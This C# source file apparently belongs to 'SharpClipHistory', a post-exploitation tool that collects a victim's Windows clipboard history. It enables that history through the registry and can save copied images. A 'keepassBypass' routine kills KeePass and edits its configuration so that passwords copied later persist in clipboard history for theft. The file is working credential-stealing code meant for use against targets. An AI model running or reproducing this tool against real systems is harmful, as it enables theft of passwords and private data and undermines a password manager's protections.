using System;
using System.Threading;
using Microsoft.Win32;
using System.Runtime.InteropServices.WindowsRuntime;
using System.Linq;
using CommandLine;
using CommandLine.Text;
using System.Diagnostics;
using System.Xml.Linq;

namespace SharpClipHistory
{
    class Program
    {

        public class Options
        {
            [Option("checkOnly", Required = false, HelpText = "Check if the Clipboard history feature is available and enabled on the target host.")]
            public bool CheckOnly { get; set; }

            [Option("enableHistory", Required = false, HelpText = "Edit the registry to enable clipboard history for the victim user and get contents.")]
            public bool EnableHistory { get; set; }

            [Option("disableHistory", Required = false, HelpText = "Edit the registry to disable clipboard history for the victim user and get contents.")]
            public bool DisableHistory { get; set; }

            [Option("saveImages", Required = false, HelpText = "Save any images in clipboard to a file in APPDATA.")]
            public bool SaveImages { get; set; }

            [Option("keepassBypass", Required = false, HelpText = "Stops KeePass if it is running and modifies the config file. Next time KeePass is launched passwords will be saved in clipboard history.")]
            public bool KeepassBypass { get; set; }

            [ParserState]
            public IParserState LastParserState { get; set; }

            [HelpOption]
            public string GetUsage()
            {
                var text = @"SharpClipHistory v1.1
Usage: SharpClipHistory.exe <option>
Options:
    --checkOnly
        Check if the Clipboard history feature is available and enabled on the target host.
    --enableHistory
        Edit the registry to enable clipboard history for the victim user and get contents.
    --disableHistory
        Edit the registry to disable clipboard history for the victim user and get contents.
    --saveImages
        Save any images in clipboard to a file in APPDATA.
    --keepassBypass
        Stops KeePass (if it is running) and modifies the config file. Next time KeePass is launched passwords will be saved in clipboard history.
";

                if (LastParserState?.Errors.Any() != true) return text;
                var errors = new HelpText().RenderParsingErrorsText(this, 2);
                text += errors;
                return text;
            }
        }

        public static void KeepassBypass()
        {
            try
            {
                foreach (Process proc in Process.GetProcessesByName("keepass"))
                {
                    Console.WriteLine("[+] Killing KeePass process!");
                    proc.Kill();
                }
            }
            catch
            {
                Console.WriteLine("[+] KeePass was not running...");
            }
            Console.WriteLine("[+] Modifying KeePass Configuration file...");
            try
            {
                string configPath = Environment.GetEnvironmentVariable("USERPROFILE") + "\\AppData\\Roaming\\KeePass\\KeePass.config.xml";
                XDocument doc = XDocument.Load(configPath);
                XElement sec = doc.Element("Configuration").Element("Security");
                sec.Add(new XElement("ClipboardNoPersist", "false"));
                doc.Save(configPath);
                Console.WriteLine("[+] KeePass configuration file modified successfully!");
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
            System.Environment.Exit(0);
        }

        public static void Main(string[] args)
        {
            bool CheckOnly = false;
            bool EnableHistory = false;
            bool DisableHistory = false;
            bool SaveImages = false;
            bool Keepass = false;

            var opts = new Options();

            if (args.Length > 1)
            {
                Console.WriteLine("\n[!] Only one option can be specified at a time.\n");
                Console.WriteLine(opts.GetUsage());
                System.Environment.Exit(0);
            }

            if (!Parser.Default.ParseArguments(args, opts))
            {
                return;
            }

            if (opts.CheckOnly)
            {
                CheckOnly = opts.CheckOnly;
            }

            if (opts.EnableHistory)
            {
                EnableHistory = opts.EnableHistory;
            }

            if (opts.DisableHistory)
            {
                DisableHistory = opts.DisableHistory;
            }

            if (opts.SaveImages)
            {
                SaveImages = opts.SaveImages;
            }

            if (opts.KeepassBypass)
            {
                Keepass = opts.KeepassBypass;
            }

            RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Clipboard", true);

            if (rk == null)
            {
                Console.WriteLine("[!] Clipboard history feature not available on target! Target needs to be at least Win10 Build 1809.\n[!] Exiting...\n");
                System.Environment.Exit(0);
            }

            // Check if Clipboard history is available
            string keyName = @"HKEY_CURRENT_USER\Software\Microsoft\Clipboard";
            string keyValue = "EnableClipboardHistory";
            var regVal = Registry.GetValue(keyName, keyValue, null);

            if (EnableHistory)
            {
                //Enable Clipboard History in HKCU
                Console.WriteLine("[+] Turning on clipboard history feature...");
                try
                {
                    rk.SetValue("EnableClipboardHistory", "1", RegistryValueKind.DWord);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex);
                }

            }
            else if (regVal.Equals(1))
            {
                Console.WriteLine("\n[+] Clipboard history feature is already enabled!");
            }

            if (DisableHistory)
            {
                //Disable Clipboard History in HKCU
                Console.WriteLine("[+] Disabling clipboard history feature...");
                try
                {
                    rk.SetValue("EnableClipboardHistory", "0", RegistryValueKind.DWord);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex);
                }

            }
            else if (regVal == null || regVal.Equals(0))
            {
                Console.WriteLine("\n[+] Clipboard history feature is disabled or not compatible on this system... (Windows 10 1809+ only...)");
            }

            if (Keepass)
            {
                KeepassBypass();
            }

            if (CheckOnly)
            {
                if (regVal == null || regVal.Equals(0))
                {
                    Console.WriteLine("\n[-] Clipboard history feature is available on the target but must be enabled.\n[-] Use --enableHistory to enable the feature.\n[!] Exiting...\n");
                    System.Environment.Exit(0);
                }

            }
                Clipboard clip = new Clipboard();
                Console.WriteLine("[+] Clipboard history Contents:\n");
                try
                {
                    clip.GetText(SaveImages);
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                }
            }
        }

        public class Clipboard
        {
            public void GetText(bool saveImages)
            {
                string ReturnValue = string.Empty;
                Thread STAThread = new Thread(
                    delegate ()
                    {
                        String clip_contents = "";
                        var HistoryContents = Windows.ApplicationModel.DataTransfer.Clipboard.GetHistoryItemsAsync();
                        var HistoryList = HistoryContents.GetAwaiter().GetResult().Items;

                        for (var i = 0; i < HistoryList.Count; i++)
                        {
                            var timestamp = HistoryList[i].Timestamp.DateTime;
                            if (HistoryList[i].Content.AvailableFormats.Contains("Text"))
                            {
                                var contents = HistoryList[i].Content.GetTextAsync();
                                clip_contents += "[+] " + timestamp + ": " + contents.GetAwaiter().GetResult() + "\n";
                            }
                            else if (HistoryList[i].Content.AvailableFormats.Contains("Bitmap"))
                            {
                                if (saveImages)
                                {
                                    var contents = HistoryList[i].Content.GetBitmapAsync().GetAwaiter().GetResult();
                                    var bitmapStream = contents.OpenReadAsync().GetAwaiter().GetResult();
                                    byte[] buffer = new byte[bitmapStream.Size];
                                    bitmapStream.ReadAsync(buffer.AsBuffer(), (uint)bitmapStream.Size, Windows.Storage.Streams.InputStreamOptions.None).GetAwaiter().GetResult();
                                    string path = String.Format("{0}\\AppData\\Local\\Packages\\{1}.bmp", Environment.GetEnvironmentVariable("USERPROFILE"), timestamp.ToFileTime());
                                    System.IO.File.WriteAllBytes(path, buffer);
                                    clip_contents += String.Format("[+] SharpClipHistory - Image found and saved in {0}.\n", path);
                                }
                                else
                                {
                                    clip_contents += "[!] SharpClipHistory - Image found. Re-run with --saveImages to save the image in the victim's APPDATA folder.\n";
                                }
                            }
                            else
                            {
                                clip_contents += "[!] Unrecognised clipboard contents format.\n";
                            }
                        }
                        Console.WriteLine(clip_contents);
                    });

                STAThread.SetApartmentState(ApartmentState.STA);
                STAThread.Start();
                STAThread.Join();
            }
        }

    }
